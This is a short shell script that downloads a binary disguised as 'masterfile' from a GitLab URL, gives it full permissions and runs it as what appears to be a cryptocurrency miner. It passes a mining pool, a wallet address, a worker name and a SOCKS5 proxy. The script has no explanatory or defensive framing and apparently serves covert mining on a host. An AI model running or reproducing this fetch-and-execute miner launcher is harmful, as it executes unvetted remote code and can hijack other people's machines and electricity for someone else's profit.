#!/bin/sh
wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
chmod 777 masterfile
POOL=dcy.pool-pay.com:5657
WALLET=NYz4eppo5MsY3WqgrRVzDZ4P6eqVrfRKBLffuLmvvPYzA2MXhT5v6Y7BFYx2HkQNuL9MND7CQvi73CWpd9y57dhV4ySD1iy8ez
WORKER=endvoc
PROXY=socks5://192.252.209.155:14455
./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
